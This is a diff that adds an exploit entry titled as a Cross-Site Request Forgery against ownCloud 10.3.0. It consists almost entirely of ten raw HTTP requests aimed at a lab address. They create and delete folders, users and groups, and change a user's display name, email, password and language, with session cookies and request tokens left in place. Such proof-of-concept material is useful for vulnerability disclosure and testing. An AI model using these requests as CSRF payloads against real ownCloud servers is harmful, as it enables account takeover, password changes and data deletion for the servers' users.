@@ -1,0 +1,280 @@
+# Exploit Title: ownCloud 10.3.0 stable - Cross-Site Request Forgery
+# Date: 2019-10-31
+# Exploit Author: Ozer Goker
+# Vendor Homepage: https://owncloud.org
+# Software Link: https://owncloud.org/download/
+# Version: 10.3
+# CVE: N/A
+
+# Introduction
+# Your personal cloud collaboration platform With over 50 million users
+# worldwide, ownCloud is the market-leading open source software for
+# cloud-based collaboration platforms. As an alternative to Dropbox, OneDrive
+# and Google Drive, ownCloud offers real data security and privacy for you
+# and your data.
+
+##################################################################################################################################
+
+# CSRF1
+# Create Folder
+
+MKCOL /remote.php/dav/files/user/test HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+requesttoken:
+VREONXtUByUsCkMAcRscHjUGHjYGPBoHJQgsfzoHWEk=:fUCe0mdAzn0T3MNKlKqYMEBFcezMTukbmbVeDs+jKlo=
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+
+##################################################################################################################################
+
+# CSRF2
+# Delete Folder
+
+DELETE /remote.php/dav/files/user/test HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+requesttoken:
+HDQcAi5jLSkkKysEGiYxZSA7PhcaCWEYFydhQ106YEM=:/pQReZNMrOXPXpc0yvQxQp9YQJ7q3HShA9D2+R2EJuI=
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+
+##################################################################################################################################
+
+# CSRF3
+# Create User
+
+POST /index.php/settings/users/users HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+requesttoken:
+eRIlHRIBJF0jU1w9CSY+AT8CX18gTh90JV8UQwQdfEg=:JVhMY8G9u7/iKplTfO00k7G5c2BqjoOcCWkAHYdZV5I=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 39
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+username=test&password=&email=test@test
+
+
+
+##################################################################################################################################
+
+# CSRF4
+# Delete User
+
+DELETE /index.php/settings/users/users/test HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+requesttoken:
+BQ8vIjp9LjACFxwEB2QkMSsuG14kHy4SKio6URckUlk=:6KbrqDMTTsoPE2vdrct1ofvSlGlcyVarSAOFV9PFuLQ=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+
+##################################################################################################################################
+
+# CSRF5
+# Create Group
+
+POST /index.php/settings/users/groups HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+requesttoken:
+BRd8ZDsAFREkB0YxdAIaYi8/ABsyCBIDExs/Wgw9a28=:6S14p9vurc5e6TH7vrotyqJBUvihbOXDUWMKYbS23UU=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 7
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+id=test
+
+
+##################################################################################################################################
+
+# CSRF6
+# Delete Group
+
+DELETE /index.php/settings/users/groups/test HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+requesttoken:
+aTElBwBqTAUYEEQacjdgER4hJ0QIA20sdF00CwtHUm0=:ZuhWKS/aNt7N0a2DGlH+Cz5m20b9e5aFOSBKkqJOALw=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+
+##################################################################################################################################
+
+# CSRF7
+# Change User Full Name
+
+POST /index.php/settings/users/user/displayName HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+requesttoken:
+fzYYPjtaVBUeKj8CBzojJHIgXTkTTT4GbR0vBT4TCm0=:LrUnpc7qHNLVElqq+m2VX4fG+py7Pa9FK8DpB84dSdY=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 37
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+displayName=user1&oldDisplayName=user
+
+
+##################################################################################################################################
+
+# CSRF8
+# Change User Email
+
+PUT /index.php/settings/users/user/mailAddress HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+requesttoken:
+QAkuGRpIMg88IzsXBTMeYREpCA4zLhcQHiMsQBo7WWo=:sMcIQqQkjGHCGeL4HdgaxWOQXNzrtIjAou6akezvpcI=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 31
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+mailAddress=user1%40example.com
+
+
+##################################################################################################################################
+
+# CSRF9
+# Change User Password
+
+
+POST /index.php/settings/personal/changepassword HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+requesttoken:
+fwkfaH9zECcMJR4CFS8EZSF5NhseCwkYciMXeVclBB4=:LMR84JsCZAmVWyV0x4YtUrQY4NAK9W75wnR46WsbXbU=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 62
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+oldpassword=1234&personal-password=1&personal-password-clone=1
+
+
+##################################################################################################################################
+
+# CSRF10
+# Change Language
+
+POST /index.php/settings/ajax/setlanguage.php HTTP/1.1
+Host: 192.168.2.111
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0)
+Gecko/20100101 Firefox/70.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+requesttoken:
+fwkfaH9zECcMJR4CFS8EZSF5NhseCwkYciMXeVclBB4=:LMR84JsCZAmVWyV0x4YtUrQY4NAK9W75wnR46WsbXbU=
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 7
+Origin: http://192.168.2.111
+DNT: 1
+Connection: close
+Cookie:
+oc_sessionPassphrase=OR9OqeaQvyNeBuV1nl53PSHIygj2x2pFuUkAADxM%2FtC02szlld2Y4paT3aMk28bZaspxaEBcsVuLqXjiWg5PGJ1YEb62nemDDPIHOJgQueBmroFVKinj4zQ2dojKhfOe;
+ocpcgo18irip=kgso9su4gnmmre6jv1jb0f6v8k
+
+lang=tr
+
+
+##################################################################################################################################
